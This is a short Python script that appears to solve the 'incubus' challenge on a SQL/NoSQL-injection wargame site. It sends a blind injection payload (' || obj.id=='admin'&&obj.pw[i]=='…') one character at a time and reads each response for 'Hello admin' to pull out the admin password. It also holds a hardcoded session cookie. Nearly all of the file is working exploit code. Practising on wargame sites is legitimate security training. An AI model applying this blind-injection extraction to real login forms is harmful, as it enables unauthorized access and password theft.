import string
import requests

url = "https://los.rubiya.kr/chall/incubus_3dff9ce783c9f574edf015a7b99450d7.php?"
params = {"pw" : None}
cookies = {"PHPSESSID" : "qp6b7g99hjr3amos0h8f72npl5"}
flag = ''

domain = string.digits + string.ascii_lowercase
for i in range(30):
    for j in domain:
        payload = "' || obj.id=='admin'&&obj.pw[{}]=='{}".format(i,j)
        params["pw"] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            flag += j
            print("find the flag",flag)
            break
    if(j == domain[-1]):
        print("flag is ",flag)
        break